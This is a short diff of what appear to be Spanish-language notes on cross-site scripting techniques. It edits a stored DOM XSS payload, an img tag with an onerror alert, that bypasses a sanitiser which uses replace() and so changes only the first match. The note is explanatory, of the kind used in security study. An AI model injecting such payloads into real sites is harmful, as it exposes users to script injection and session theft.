@@ -63,7 +63,7 @@ probando\"*alert(0)}//
 Stored DOM XSS:
 ```
 --> Se aplica sanitizacion con 'replace()', al cambiar solo la primera aparicion podemos hacer algo asi:
-<><img src=FuckYou onerror=alert(0)>
+<img src=FuckYou onerror=alert(0)>
 ```
 
 Reflected XSS con etiquetas bloqueadas:
